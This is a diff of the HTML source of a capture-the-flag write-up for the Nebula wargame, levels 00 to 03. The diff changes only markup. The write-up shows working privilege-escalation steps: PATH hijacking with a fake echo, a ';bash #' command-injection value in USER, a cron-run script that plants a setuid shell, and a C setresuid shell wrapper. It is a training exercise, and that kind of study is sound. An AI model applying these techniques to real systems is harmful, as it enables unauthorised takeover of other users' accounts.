 &lt;p&gt;Search for all files, in all directories, belonging to &lt;code&gt;flag00&lt;/code&gt; user, with &lt;a href="https://en.wikipedia.org/wiki/Setuid"&gt;setuid&lt;/a&gt;. Redirect all "permission error" (stderr) messages to &lt;code&gt;/dev/null&lt;/code&gt; discarding those messages.&lt;/p&gt;
 &lt;h4&gt;Result&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level00@nebula:~$ getflag
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level00@nebula:~$ getflag
 getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
 level00@nebula:~$ find / -type f -user flag00 -perm -0400 &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
 /bin/.../flag00
@@ -965,7 +1009,7 @@ Congrats, now run getflag to get your flag!
 flag00@nebula:~$
 flag00@nebula:~$ getflag
 You have successfully executed getflag on a target account
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-01/"&gt;Level01&lt;/a&gt;&lt;/h2&gt;
@@ -973,7 +1017,7 @@ You have successfully executed getflag on a target account
 &lt;p&gt;Program allows to execute arbitrary program due to &lt;code&gt;system&lt;/code&gt; call for &lt;code&gt;echo&lt;/code&gt;.
 Let's create fake echo with to run &lt;code&gt;bash&lt;/code&gt; session with &lt;code&gt;flag01&lt;/code&gt; UID.&lt;/p&gt;
 &lt;h4&gt;Result&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level01@nebula:~$ getflag
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level01@nebula:~$ getflag
 getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
 level01@nebula:~$ cat &amp;gt; /tmp/echo &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
 &lt;span class="s"&gt;&amp;gt; #!/usr/bin/env bash&lt;/span&gt;
@@ -986,28 +1030,28 @@ and now what?
 level01@nebula:/home/flag01$ &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp:&lt;span class="nv"&gt;$PATH&lt;/span&gt; ./flag01
 flag01@nebula:/home/flag01$ getflag
 You have successfully executed getflag on a target account
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-02/"&gt;Level02&lt;/a&gt;&lt;/h2&gt;
 &lt;h4&gt;Solution&lt;/h4&gt;
 &lt;p&gt;Program is reading &lt;code&gt;USER&lt;/code&gt; variable, which can be provided by attacker.&lt;/p&gt;
 &lt;h4&gt;Result&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level02@nebula:~$ getflag
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level02@nebula:~$ getflag
 getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
 level02@nebula:~$ &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;;bash #&amp;quot;&lt;/span&gt; /home/flag02/flag02
 about to call system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/echo ;bash # is cool&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
 
 flag02@nebula:~$ getflag
 You have successfully executed getflag on a target account
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-03/"&gt;Level03&lt;/a&gt;&lt;/h2&gt;
 &lt;h4&gt;Solution&lt;/h4&gt;
 &lt;p&gt;Cron is running script which is picking up content of &lt;code&gt;writable.d&lt;/code&gt; directory. It is executing whatever is there. It means, that anything what is running via cron, will have the same permissions.&lt;/p&gt;
 &lt;h4&gt;Result&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level03@nebula:~$ getflag
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level03@nebula:~$ getflag
 getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
 level03@nebula:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag03
 level03@nebula:/home/flag03$ cat &amp;gt; writable.d/flag &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
@@ -1016,13 +1060,13 @@ level03@nebula:/home/flag03$ cat &amp;gt; writable.d/flag &lt;span class="s"&gt;
 &lt;span class="s"&gt;&amp;gt; EOF&lt;/span&gt;
 level03@nebula:/home/flag03$ cat /tmp/flag.result
 You have successfully executed getflag on a target account
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h4&gt;Solution2&lt;/h4&gt;
 &lt;p&gt;Prepare simple C program to gain bash access&lt;/p&gt;
 &lt;h4&gt;Result2&lt;/h4&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
 &lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
 &lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
 
@@ -1036,24 +1080,24 @@ You have successfully executed getflag on a target account
   &lt;span class="n"&gt;setresuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
   &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level03@nebula:/tmp$ cat &amp;gt; /home/flag03/writable.d/exploit.sh &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;level03@nebula:/tmp$ cat &amp;gt; /home/flag03/writable.d/exploit.sh &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
 &lt;span class="s"&gt;&amp;gt; #!/usr/bin/env bash&lt;/span&gt;
 &lt;span class="s"&gt;&amp;gt; cp /tmp/exploit /home/flag03/exploitable&lt;/span&gt;
 &lt;span class="s"&gt;&amp;gt; chmod u+s /home/flag03/exploitable&lt;/span&gt;
 &lt;span class="s"&gt;&amp;gt; EOF&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h4&gt;Mistakes&lt;/h4&gt;
 &lt;h5&gt;First&lt;/h5&gt;
 &lt;p&gt;I tried to create copy of &lt;code&gt;exploit&lt;/code&gt; program in &lt;code&gt;/tmp&lt;/code&gt; directory. However, when I tried to run it, it didn't give me &lt;code&gt;flag03&lt;/code&gt; user. After looking into &lt;code&gt;/etc/fstab&lt;/code&gt; it became obvious:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;flag03@nebula:/home/flag03$ cat /etc/fstab&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;flag03@nebula:/home/flag03$ cat /etc/fstab&lt;/span&gt;
 &lt;span class="err"&gt;overlayfs / overlayfs rw 0 0&lt;/span&gt;
 &lt;span class="err"&gt;tmpfs /tmp tmpfs nosuid,nodev 0 0&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;&lt;code&gt;tmpfs&lt;/code&gt; has &lt;code&gt;nosuid&lt;/code&gt; option. It means, that the nosuid mount option specifies that the filesystem cannot contain set userid files.&lt;/p&gt;
